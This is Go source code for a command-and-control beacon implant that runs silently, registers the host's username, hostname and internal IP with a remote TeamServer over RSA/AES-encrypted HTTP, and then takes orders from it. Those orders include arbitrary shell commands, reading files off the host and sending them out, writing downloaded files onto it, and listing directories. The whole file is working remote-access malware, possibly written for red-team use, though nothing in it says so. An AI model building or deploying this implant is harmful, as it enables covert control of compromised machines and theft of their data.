package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	_ "embed"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"time"
)

//go:embed listener.pub
var listenerPublicKey []byte

var (
	serverURL     string // To be set at build time via -ldflags
	beaconID      string
	sessionID     string
	sessionKey    []byte
	sleepInterval = 5 * time.Second
	jitter        = 2 * time.Second
)

// --- Silent Mode Support ---
// In production C2 beacons, we should be silent (no stdout output)
// Set SilentMode = true to disable all log output
const SilentMode = true

func init() {
	if SilentMode {
		// Disable all log output by setting output to io.Discard
		log.SetOutput(io.Discard)
	}
}

// --- Structs for JSON marshaling ---

type BeaconMetadata struct {
	PID           int    `json:"pid"`
	OS            string `json:"os"`
	Arch          string `json:"arch"`
	Username      string `json:"username"`
	Hostname      string `json:"hostname"`
	InternalIP    string `json:"internal_ip"`
	ProcessName   string `json:"process_name"`
	IsHighIntegrity bool   `json:"is_high_integrity"`
}

type StagingResponse struct {
	AssignedBeaconID string `json:"assigned_beacon_id"`
}

type Task struct {
	TaskID    string `json:"task_id"`
	CommandID uint32 `json:"command_id"`
	Arguments []byte `json:"arguments"`
}

type CheckInResponse struct {
	Tasks    []*Task `json:"tasks"`
	NewSleep int32   `json:"new_sleep"`
}

type FileInfo struct {
	Name        string `json:"name"`
	IsDir       bool   `json:"is_dir"`
	Size        int64  `json:"size"`
	LastModTime string `json:"last_mod_time"`
}

// --- Main Logic ---

// main is the entry point of the beacon.
// It performs the initial handshake and staging, then enters the check-in loop.
func main() {
	if serverURL == "" {
		log.Fatal("serverURL is not set. Please set it at build time using -ldflags.")
	}

	if err := performHandshake(); err != nil {
		log.Fatalf("Handshake failed: %v", err)
	}
	log.Println("Handshake successful, session established.")

	if err := stageBeacon(); err != nil {
		log.Fatalf("Staging failed: %v", err)
	}
	log.Printf("Staged successfully, got BeaconID: %s", beaconID)

	checkInLoop()
}

// checkInLoop is the main loop of the beacon.
// It periodically checks in with the TeamServer to get tasks and sends back the results.
func checkInLoop() {
	log.Println("Entering check-in loop...")
	for {
		time.Sleep(sleepInterval)
		log.Printf("Checking in for tasks (interval: %s)...")

		checkinReqMap := map[string]string{"beacon_id": beaconID}
		checkinReqBody, _ := json.Marshal(checkinReqMap)

		encryptedCheckin, err := encrypt(checkinReqBody)
		if err != nil {
			log.Printf("Failed to encrypt checkin data: %v", err)
			continue
		}

		checkinResp, err := doPost(serverURL+"/checkin", encryptedCheckin)
		if err != nil {
			log.Printf("Check-in failed: %v", err)
			continue
		}

		var checkinData CheckInResponse
		if err := json.Unmarshal(checkinResp, &checkinData); err != nil {
			log.Printf("Failed to decode check-in response: %v", err)
			continue
		}

		if len(checkinData.Tasks) == 0 {
			log.Println("No tasks received.")
			continue
		}

		processTasks(checkinData.Tasks)
	}
}

// processTasks iterates over the received tasks and executes them.
func processTasks(tasks []*Task) {
	for _, task := range tasks {
		var output []byte
		var err error

		switch task.CommandID {
		case 1: // Shell
			output, err = handleShellTask(task)
		case 2: // Download
			err = handleDownloadTask(task)
			if err == nil {
				output = []byte("File downloaded successfully.")
			}
		case 3: // Upload
			output, err = handleUploadTask(task)
		case 4: // Exit
			handleExitTask()
		case 5: // Sleep
			output, err = handleSleepTask(task)
		case 6: // Browse
			output, err = handleBrowseTask(task)
		default:
			err = fmt.Errorf("unknown command ID: %d", task.CommandID)
		}

		if err != nil {
			log.Printf("Error executing task %s: %v", task.TaskID, err)
			output = []byte(fmt.Sprintf("Task failed: %v", err))
		}

		pushTaskOutput(task.TaskID, output)
	}
}

// --- Task Handlers ---

func handleShellTask(task *Task) ([]byte, error) {
	return executeShellCommand(string(task.Arguments))
}

func handleUploadTask(task *Task) ([]byte, error) {
	sourcePath := string(task.Arguments)
	log.Printf("Reading file from %s to upload", sourcePath)
	return os.ReadFile(sourcePath)
}

func handleExitTask() {
	log.Println("Received exit command. Terminating.")
	os.Exit(0)
}

func handleSleepTask(task *Task) ([]byte, error) {
	var newSleep int32
	// 调试：打印原始参数
	log.Printf("Sleep task received. TaskID: %s, Arguments length: %d, Arguments raw: %q", task.TaskID, len(task.Arguments), string(task.Arguments))

	if len(task.Arguments) == 0 {
		return nil, fmt.Errorf("empty sleep arguments")
	}
	// 尝试解析为JSON数字或字符串
	var sleepValue interface{}
	if err := json.Unmarshal(task.Arguments, &sleepValue); err != nil {
		return nil, fmt.Errorf("invalid JSON: %v", err)
	}

	// 处理数字或字符串格式
	switch v := sleepValue.(type) {
	case float64: // JSON数字: 30
		newSleep = int32(v)
	case string: // JSON字符串: "30"
		parsed, err := parseInt32(v)
		if err != nil {
			return nil, fmt.Errorf("invalid sleep value: %s", v)
		}
		newSleep = parsed
	default:
		return nil, fmt.Errorf("unsupported sleep argument type: %T", v)
	}

	// 验证范围
	if newSleep < 1 || newSleep > 3600 {
		return nil, fmt.Errorf("sleep value must be between 1 and 3600 seconds, got %d", newSleep)
	}

	sleepInterval = time.Duration(newSleep) * time.Second
	log.Printf("Updated check-in interval to %s", sleepInterval)
	return []byte(fmt.Sprintf("Sleep interval set to %d seconds", newSleep)), nil
}

func pushTaskOutput(taskID string, output []byte) {
	outputMap := map[string]interface{}{
		"beacon_id": beaconID,
		"task_id":   taskID,
		"output":    output,
	}
	outputReqBody, _ := json.Marshal(outputMap)

	encryptedOutput, err := encrypt(outputReqBody)
	if err != nil {
		log.Printf("Failed to encrypt task output for %s: %v", taskID, err)
		return
	}

	_, err = doPost(serverURL+"/output", encryptedOutput)
	if err != nil {
		log.Printf("Failed to push output for task %s: %v", taskID, err)
	} else {
		log.Printf("Successfully pushed output for task %s", taskID)
	}
}

// --- HTTP & Staging ---

// stageBeacon sends the initial beacon metadata to the TeamServer to register itself.
func stageBeacon() error {
	hostname, _ := os.Hostname()
	metadata := BeaconMetadata{
		PID:           os.Getpid(),
		OS:            runtime.GOOS,
		Arch:          runtime.GOARCH,
		Username:      getUsername(),
		Hostname:      hostname,
		InternalIP:    getInternalIP(),
		ProcessName:   os.Args[0],
		IsHighIntegrity: false, // Simplified
	}

	jsonData, err := json.Marshal(metadata)
	if err != nil {
		return fmt.Errorf("failed to marshal metadata: %v", err)
	}

	encryptedData, err := encrypt(jsonData)
	if err != nil {
		return fmt.Errorf("failed to encrypt staging data: %v", err)
	}

	decryptedBody, err := doPost(serverURL+"/stage", encryptedData)
	if err != nil {
		return err
	}

	var stageResp StagingResponse
	if err := json.Unmarshal(decryptedBody, &stageResp); err != nil {
		return fmt.Errorf("failed to decode staging response: %v", err)
	}

	beaconID = stageResp.AssignedBeaconID
	return nil
}

// doPost performs a POST request to the TeamServer with the given URL and body.
// It handles the encryption and decryption of the request and response.
func doPost(url string, body []byte) ([]byte, error) {
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(body))
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Session-ID", sessionID)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		log.Println("Beacon not found on TeamServer. Terminating.")
		os.Exit(0) // Exit if beacon is disowned
	}

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("request failed with status %s: %s", resp.Status, string(respBody))
	}

	encryptedBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %v", err)
	}

	// An empty body can be a valid response (e.g. for task output)
	if len(encryptedBody) == 0 {
		return nil, nil
	}

	return decrypt(encryptedBody)
}

// --- Encryption & Handshake ---

// performHandshake performs the initial handshake with the listener to establish a session and a session key.
func performHandshake() error {
	key := make([]byte, 32) // AES-256
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("could not generate session key: %v", err)
	}
	sessionKey = key

	block, _ := pem.Decode(listenerPublicKey)
	if block == nil {
		return fmt.Errorf("failed to decode PEM block containing public key")
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return fmt.Errorf("failed to parse public key: %v", err)
	}
	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return fmt.Errorf("public key is not an RSA key")
	}

	encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPub, sessionKey, nil)
	if err != nil {
		return fmt.Errorf("failed to encrypt session key: %v", err)
	}

	resp, err := http.Post(serverURL+"/handshake", "application/octet-stream", bytes.NewBuffer(encryptedKey))
	if err != nil {
		return fmt.Errorf("failed to send handshake request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("handshake failed with status %s: %s", resp.Status, string(body))
	}

	var respBody struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&respBody); err != nil {
		return fmt.Errorf("failed to decode handshake response: %v", err)
	}

	sessionID = respBody.SessionID
	if sessionID == "" {
		return fmt.Errorf("listener did not return a session ID")
	}

	return nil
}

func encrypt(plaintext []byte) ([]byte, error) {
	c, err := aes.NewCipher(sessionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func decrypt(ciphertext []byte) ([]byte, error) {
	c, err := aes.NewCipher(sessionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// --- Helper Functions ---

func getUsername() string {
	currentUser, err := user.Current()
	if err != nil {
		return "unknown"
	}
	return currentUser.Username
}

func getInternalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "127.0.0.1"
}

func executeShellCommand(command string) ([]byte, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}
	return cmd.CombinedOutput()
}

func handleDownloadTask(task *Task) error {
	// 1. Parse metadata from arguments
	var args struct {
		Source      string `json:"source"`
		Destination string `json:"destination"`
		FileSize    int64  `json:"file_size"`
		ChunkSize   int    `json:"chunk_size"`
	}
	if err := json.Unmarshal(task.Arguments, &args); err != nil {
		return fmt.Errorf("could not unmarshal download metadata: %v", err)
	}

	if args.ChunkSize == 0 {
		return fmt.Errorf("chunk size cannot be zero")
	}

	// 2. Create temporary file
	tempFilePath := args.Destination + ".tmp"
	destFile, err := os.Create(tempFilePath)
	if err != nil {
		return fmt.Errorf("could not create temporary file %s: %v", tempFilePath, err)
	}
	defer destFile.Close()

	// 3. Calculate total chunks and loop
	totalChunks := (args.FileSize + int64(args.ChunkSize) - 1) / int64(args.ChunkSize)
	log.Printf("Starting download of %s to %s. Total size: %d bytes, Chunks: %d", args.Source, args.Destination, args.FileSize, totalChunks)

	for i := int64(0); i < totalChunks; i++ {
		// 4. Request chunk from listener
		chunkReqMap := map[string]interface{}{
			"task_id":      task.TaskID,
			"chunk_number": i,
		}
		chunkReqBody, _ := json.Marshal(chunkReqMap)

		encryptedReq, err := encrypt(chunkReqBody)
		if err != nil {
			os.Remove(tempFilePath) // Cleanup
			return fmt.Errorf("failed to encrypt chunk request for chunk %d: %v", i, err)
		}

		// The raw chunk data is returned encrypted, so we must decrypt it
		encryptedChunkData, err := doPostAndGetRaw(serverURL+"/chunk", encryptedReq)
		if err != nil {
			os.Remove(tempFilePath) // Cleanup
			return fmt.Errorf("failed to download chunk %d: %v", i, err)
		}

		chunkData, err := decrypt(encryptedChunkData)
		if err != nil {
			os.Remove(tempFilePath) // Cleanup
			return fmt.Errorf("failed to decrypt chunk %d: %v", i, err)
		}

		// 5. Write chunk to file
		if _, err := destFile.Write(chunkData); err != nil {
			os.Remove(tempFilePath) // Cleanup
			return fmt.Errorf("failed to write chunk %d to temporary file: %v", i, err)
		}
		log.Printf("Downloaded and wrote chunk %d/%d", i+1, totalChunks)
	}

	// 6. Rename file
	if err := os.Rename(tempFilePath, args.Destination); err != nil {
		os.Remove(tempFilePath) // Cleanup
		return fmt.Errorf("failed to rename temporary file to %s: %v", args.Destination, err)
	}

	log.Printf("Successfully downloaded file to %s", args.Destination)
	return nil
}


func handleBrowseTask(task *Task) ([]byte, error) {
	dirPath := string(task.Arguments)
	log.Printf("Browsing directory: %s", dirPath)

	absoluteDirPath, err := filepath.Abs(dirPath)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve absolute path for %s: %v", dirPath, err)
	}

	entries, err := os.ReadDir(absoluteDirPath)
	if err != nil {
		log.Printf("Error reading directory %s: %v", absoluteDirPath, err)
		jsonOutput, _ := json.Marshal([]FileInfo{})
		return []byte(absoluteDirPath + "\n" + string(jsonOutput)), nil
	}

	files := make([]FileInfo, 0)
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			log.Printf("Warning: failed to get info for %s: %v", entry.Name(), err)
			continue
		}
		files = append(files, FileInfo{
			Name:        info.Name(),
			IsDir:       info.IsDir(),
			Size:        info.Size(),
			LastModTime: info.ModTime().Format(time.RFC3339),
		})
	}

	jsonOutput, err := json.Marshal(files)
	if err != nil {
		log.Printf("Error marshaling file info to JSON for %s: %v", dirPath, err)
		jsonOutput = []byte("[]")
	}

	return []byte(absoluteDirPath + "\n" + string(jsonOutput)), nil
}

// doPostAndGetRaw is a variant of doPost that returns the raw (but still encrypted) response body,
// without trying to decrypt it. This is needed for downloading file chunks.
func doPostAndGetRaw(url string, body []byte) ([]byte, error) {
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(body))
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Session-ID", sessionID)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("request failed with status %s: %s", resp.Status, string(respBody))
	}

	return io.ReadAll(resp.Body)
}


// parseInt32 解析字符串为int32
func parseInt32(s string) (int32, error) {
	var result int64
	var err error
	if result, err = strconv.ParseInt(s, 10, 32); err != nil {
		return 0, err
	}
	return int32(result), nil
}